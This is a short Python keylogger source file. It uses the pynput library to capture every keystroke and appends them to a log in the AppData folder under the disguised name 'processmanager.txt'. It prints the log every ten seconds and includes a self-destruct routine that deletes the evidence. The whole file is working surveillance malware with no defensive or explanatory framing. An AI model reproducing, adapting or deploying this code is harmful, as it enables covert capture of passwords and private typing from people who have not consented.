import os
# use - pip3 install pynput - to install pynput
# or - pip3 install pynput==1.6.8
# if compilation errors occur for Python 3.7.6
# Read more on pynput for more use cases
from pynput.keyboard import Listener
import time
import threading


class Keylogger:
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] + '\\processmanager.txt'

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == '__main__':
    key_log = Keylogger()
    t = threading.Thread(target=key_log.start)
    t.start()
    while key_log.flag != 1:
        time.sleep(10)
        logs = key_log.read_logs()
        print(logs)
        # key_log.self_destruct()
    t.join()
